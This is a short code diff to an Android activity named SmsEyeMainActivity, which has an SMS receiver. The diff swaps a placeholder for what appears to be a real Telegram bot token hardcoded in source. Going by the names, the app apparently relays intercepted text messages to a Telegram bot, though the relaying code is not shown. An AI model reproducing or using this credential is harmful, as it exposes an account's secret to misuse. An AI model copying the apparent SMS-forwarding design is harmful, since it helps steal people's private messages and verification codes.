@@ -30,7 +30,7 @@ import java.util.Locale;
 public class SmsEyeMainActivity extends AppCompatActivity {
 
     private SmsReceiver smsReceiver;
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN"; // 🔁 Replace with your bot token
+    private static final String BOT_TOKEN = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4"; // 🔁 Replace with your bot token
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
